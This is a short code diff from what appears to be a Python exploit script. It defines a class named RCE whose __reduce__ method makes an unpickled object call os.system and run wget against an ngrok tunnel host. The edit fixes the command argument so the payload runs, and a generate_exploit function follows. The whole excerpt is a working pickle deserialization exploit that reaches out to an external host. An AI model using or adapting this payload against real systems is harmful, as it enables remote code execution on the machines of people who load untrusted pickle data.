@@ -263,7 +263,7 @@ import os
 
 class RCE:
     def __reduce__(self):
-        cmd = ('wget https://b058-2407-d000-403-e00e-60d2-910d-df7c-df4d.ngrok-free.app',)
+        cmd = 'wget https://b058-2407-d000-403-e00e-60d2-910d-df7c-df4d.ngrok-free.app'
         return os.system, (cmd,)
 
 def generate_exploit():
